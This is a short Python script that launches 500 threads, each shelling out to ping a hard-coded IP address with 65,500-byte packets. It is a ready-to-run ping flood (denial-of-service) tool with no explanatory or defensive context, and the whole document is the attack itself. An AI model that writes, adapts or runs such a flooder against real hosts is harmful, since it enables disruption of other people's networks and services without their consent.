# -*- coding: utf-8 -*-
import subprocess
import _thread
import time


def pod(idp):
    subprocess.call("ping 80.80.101.96 -l 65500", shell=True)
    print("%d" % idp)


for i in range(500):
    _thread.start_new_thread(pod, (i,))
    time.sleep(0.8)
